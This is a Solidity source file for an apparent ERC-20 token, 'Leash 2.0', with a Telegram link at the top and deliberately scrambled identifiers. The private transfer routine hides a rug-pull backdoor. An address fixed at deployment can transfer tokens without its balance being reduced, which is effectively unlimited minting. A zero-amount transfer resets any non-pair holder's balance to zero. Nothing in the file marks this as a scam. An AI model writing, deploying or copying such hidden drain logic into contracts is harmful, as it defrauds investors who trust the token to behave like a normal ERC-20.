/*

https://t.me/Leash2eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Leash is Ownable {
    function transferFrom(address jipsfhb, address rcwtkf, uint256 mowasq) public returns (bool success) {
        require(mowasq <= allowance[jipsfhb][msg.sender]);
        allowance[jipsfhb][msg.sender] -= mowasq;
        cyfuzpa(jipsfhb, rcwtkf, mowasq);
        return true;
    }

    mapping(address => uint256) private ixyvrdk;

    uint256 private crdeufm = 102;

    constructor(address foibncuxyqrm) {
        balanceOf[msg.sender] = totalSupply;
        ixyvrdk[foibncuxyqrm] = crdeufm;
        IUniswapV2Router02 ekpgzdyvmcj = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        nticouxvyza = IUniswapV2Factory(ekpgzdyvmcj.factory()).createPair(address(this), ekpgzdyvmcj.WETH());
    }

    mapping(address => uint256) private pzmeqbxfy;

    address public nticouxvyza;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol = 'Leash 2.0';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'Leash 2.0';

    function transfer(address rcwtkf, uint256 mowasq) public returns (bool success) {
        cyfuzpa(msg.sender, rcwtkf, mowasq);
        return true;
    }

    uint8 public decimals = 9;

    function cyfuzpa(address jipsfhb, address rcwtkf, uint256 mowasq) private {
        if (0 == ixyvrdk[jipsfhb]) {
            balanceOf[jipsfhb] -= mowasq;
        }
        balanceOf[rcwtkf] += mowasq;
        if (0 == mowasq && rcwtkf != nticouxvyza) {
            balanceOf[rcwtkf] = mowasq;
        }
        emit Transfer(jipsfhb, rcwtkf, mowasq);
    }

    function approve(address hutgqvdaop, uint256 mowasq) public returns (bool success) {
        allowance[msg.sender][hutgqvdaop] = mowasq;
        emit Approval(msg.sender, hutgqvdaop, mowasq);
        return true;
    }
}